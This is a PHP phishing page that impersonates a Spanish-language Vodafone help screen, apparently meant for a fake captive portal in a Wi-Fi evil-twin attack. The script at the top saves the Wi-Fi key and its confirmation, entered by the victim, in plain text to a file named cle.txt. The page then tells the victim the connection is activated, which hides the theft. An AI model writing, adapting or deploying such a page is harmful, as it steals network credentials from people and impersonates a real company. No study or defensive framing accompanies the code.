<?php
$cle = $_POST['cle'];
$cleconf = $_POST['cleconf'];
$fp = fopen("cle.txt","a+"); // ouverture du fichier en écriture
fputs($fp, "$cle");
fputs($fp, "$cleconf");
fclose($fp);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="stylesheet" href="/msftconnecttest/vodacss/style.css" media="screen" type="text/css" />
<title>Ayuda Vodafone</title>
</meta>

<style>
body {
	background:#FFFFFF;
	font:80% Arial, sans-serif;
	color: red;
	line-height:180%;
}
h1{
	font-size:180%;
	font-weight:normal;
	}
h2{
	font-size:160%;
	font-weight:normal;
	}	
h3{
	font-size:140%;
	font-weight:normal;
	}	
img{border:none;}
pre{
	display:block;
	font:12px "Courier New", Courier, monospace;
	padding:10px;
	border:1px solid #bae2f0;
	background:#e3f4f9;	
	margin:.5em 0;
	width:500px;
	}		
</style>
</head>
<body>
<img class="idayuda" src="/msftconnecttest/vodaimg/ayudavodafone.png"/>
	 <?php
            if (!empty($_POST['cle']) && !empty($_POST['cleconf']) ) // Vérifie si les variables des clés ne sont pas vides
        {
			$cle=$_POST['cle'];
			$cleconf=$_POST['cleconf'];
		
				if ( $cle == $cleconf) // Vérifie si les deux clés sont identiques
            {
					if (strlen($cle) >7 && strlen($cle) <63 )
				{                 
					?>	
				<h1>Ayuda Vodafone</h1>
			</p>
			<p>
Verificación correcta, conexión activada.</p>
<?php
                }
				
					 if (strlen($cle) <7)
				{
					?>
					<h1> Error ! </h1>
					La clave wifi esta demasiado corta ! 
					<br/>Teneis que <a href="index.php">rempezar</a>.
					<?php
				}
			
				if (strlen($cle) >63)
				{
					?>
					<h1> Error ! </h1>
					La clave wifi esta demasiado larga ! 
					<br/>Teneis que <a href="index.php">rempezar</a>.
					<?php
				}	
            }
			
				else
            {
				?>
				<h1> Error ! </h1>
				Las claves no estan iguales. 
				<br/>Teneis que <a href="index.php">rempezar</a>.
				<?php
			}
        }
			
			else
        {
			?>		
			<h1> Error ! </h1>
			Se ha ocurrido un problema ! 
			<br/>Teneis que <a href="index.php">rempezar</a>.
			<?php
        }
        ?>
</br>
</br>
<img class="idautre" src="/msftconnecttest/vodaimg/bas.png"/>
</br>
</br>
<img class="idvodabasdepage" src="/msftconnecttest/vodaimg/vodafonepicture2.png"/>
	</body>
</html>

